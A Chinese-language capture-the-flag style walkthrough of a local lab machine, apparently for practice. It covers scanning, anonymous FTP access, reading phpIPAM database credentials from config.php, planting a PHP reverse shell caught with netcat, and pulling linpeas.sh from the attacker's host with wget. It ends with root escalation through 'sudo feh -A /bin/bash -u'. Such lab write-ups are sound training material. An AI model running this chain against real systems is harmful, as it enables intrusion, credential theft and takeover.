## 靶机地址

https://mega.nz/file/z99ByIpa#HPylwxHNwmXHFc71JnolvZw6T2tzbLj1JVSCOi8YnB4

![image-20250425134812575](assets/image-20250425134812575.png)



## 信息收集

### 准备阶段

创建文件夹用来存放信息

```
mkdir report
```

![image-20250425135249561](assets/image-20250425135249561.png)



###  主机探测

```
arp-scan --interface=vboxnet0 -l
nmap -sn 192.168.56.0/241
```

![image-20250425135334777](assets/image-20250425135334777.png)



确定靶机ip：192.168.56.112



#### 端口扫描

```
nmap -sT -p- --min-rate 10000 192.168.56.112 -oN ./report/portscan
```

![image-20250425135447136](assets/image-20250425135447136.png)



开放了ftp和http服务





#### 提取端口信息

```
cat ./report/portscan  | grep open | awk -F'/' '{print $1}' | paste -sd,
```

![image-20250425135534804](assets/image-20250425135534804.png)



#### 详细结果扫描

```
sudo nmap -sCV -O -p 21,80 192.168.56.112 -oN ./report/detail
```

![image-20250425135707871](assets/image-20250425135707871.png)

分析扫描结果

- 21 ftp ，虽然报告中没有明确指出是否可以匿名登陆。但是可以尝试一下

- 80 http





#### udp扫描

```
sudo nmap -sU --top-ports 20 192.168.56.112
```

![image-20250425135859250](assets/image-20250425135859250.png)





### fscan扫描

```
fscan -h 192.168.56.112
```

![image-20250425140006499](assets/image-20250425140006499.png)









### 21端口

#### 尝试匿名登陆

```
lftp 192.168.56.112 -u anonymous
```

![image-20250425140143968](assets/image-20250425140143968.png)



空密码登陆失败

但是anonymous：anonymous登陆成功



结合扫描结果，该靶机开放了80端口

#### 进入/var/www/html

```
cd /var/www/html
cd phpipam
ls
```

![image-20250425140846038](assets/image-20250425140846038.png)



存在phpipam CMS，同时存在config.php文件

#### 查看配置文件

```
cat config.php
```

![image-20250425140934893](assets/image-20250425140934893.png)





![image-20250425141026132](assets/image-20250425141026132.png)



#### 得到了两个账号

```
phpipam:phpipmadmin
USERNAME:PASSWORD
```





然后继续翻

![image-20250425141230695](assets/image-20250425141230695.png)

在phpipam/app/admin下有一个import-export目录

而其中的upload文件夹有777的权限

![image-20250425141335233](assets/image-20250425141335233.png)

也就是我们可以尝试上传webshell

#### 上传reverse_shell文件

```
cd upload
put reverse_shell.php
ls
```

![image-20250425141650666](assets/image-20250425141650666.png)



此时我们可以看到默认权限为600，即只有anonymous用户可读，因此需要修改其权限以确保web端可以访问

```
chmod 777 reverse_shell.php
ls
```

![image-20250425141926507](assets/image-20250425141926507.png)



### 本地监听

```
sudo nc -lvp 283
```

![image-20250425142249453](assets/image-20250425142249453.png)



### 然后直接在web端访问reverse_shell.php

```
http://192.168.56.112/phpipam/app/admin/import-export/upload/reverse_shell.php
```

![image-20250425142209297](assets/image-20250425142209297.png)



成功连接





## 提权

### 查看flag

```
cd /home
ls
cd italia
ls
cat user.txt
```

![image-20250425142348773](assets/image-20250425142348773.png)



权限不足



```
ls -al
```

![image-20250425142503940](assets/image-20250425142503940.png)



pazz.php和user.txt都是不可读的



### 上传linpeas.sh

### 本地开启http服务

```
python -m http.server 9000
```

![image-20250425142744798](assets/image-20250425142744798.png)



### 下载

```
cd /tmp
wget 192.168.56.1:9000/linpeas.sh
```

![image-20250425142837054](assets/image-20250425142837054.png)



### 运行脚本

```
bash linpeas.sh
```

![image-20250425142922853](assets/image-20250425142922853.png)

![image-20250425143119032](assets/image-20250425143119032.png)

然后发现了一个奇怪的端口 12345



### nc连接

```
which nc
nc 127.0.0.1 12345
```

![image-20250425143205643](assets/image-20250425143205643.png)

靶机中存在nc， 尝试nc连一下

连接后随便输入点东西，存在回显



观察内容发现其是重复输出，去重后cyberchef解码后得到png图片

### base64转图片

![image-20250425143949810](assets/image-20250425143949810.png)



提示rootisCLOSE,可能是密码

![image-20250425150410781](assets/image-20250425150410781.png)

然后aes-256-cbc加密



### 转换终端

```
/bin/bash -i
```

![image-20250425144213307](assets/image-20250425144213307.png)





### 然后尝试切换为italia用户

```
su - italia
```

![image-20250425144236067](assets/image-20250425144236067.png)



### 再次转换终端

```
/bin/bash -i
```

![image-20250425144315720](assets/image-20250425144315720.png)



### 执行sudo -l

```
sudo -l
```

![image-20250425144339418](assets/image-20250425144339418.png)





### feh提权

feh是一个图片查看器

本地看一下能不能尝试执行命令

```
man feh
```

![image-20250425144848442](assets/image-20250425144848442.png)



发现其-A参数可以用来执行命令



靶机中尝试

```
sudo feh -A id
```

![image-20250425145617034](assets/image-20250425145617034.png)

报错，不能打开X display

然后继续查看帮助信息

![image-20250425145057796](assets/image-20250425145057796.png)

-U参数可以实现不打开图片，只输出信息



但是我尝试了一下

```
sudo feh -A id -U
```

![image-20250425145603112](assets/image-20250425145603112.png)

没有执行命令



然后我看了靶机上的feh帮助信息

![image-20250425145503511](assets/image-20250425145503511.png)

发现该版本是 -u



```
sudo feh -A id -u
```

![image-20250425145633278](assets/image-20250425145633278.png)

成功执行



### 尝试执行/bin/bash

```
sudo feh -A /bin/bash -u
whoami
```

![image-20250425145729488](assets/image-20250425145729488.png)

成功提权



### 进入/root

```
/bin/bash -i
cd /root
ls
```

![image-20250425145841854](assets/image-20250425145841854.png)



发现flag被加密





结合png中给出的提示，可能是aes-256-cbc



### 查看靶机中是否有openssl

```
which openssl
```

![image-20250425150011115](assets/image-20250425150011115.png)





### 利用openssl解密

```
openssl enc -d -aes-256-cbc -in root.enc -out root.txt
cat root.txt
```

![image-20250425150236193](assets/image-20250425150236193.png)



### 得到flag



```
cat /home/italia/user.txt
```

![image-20250425150354061](assets/image-20250425150354061.png)



















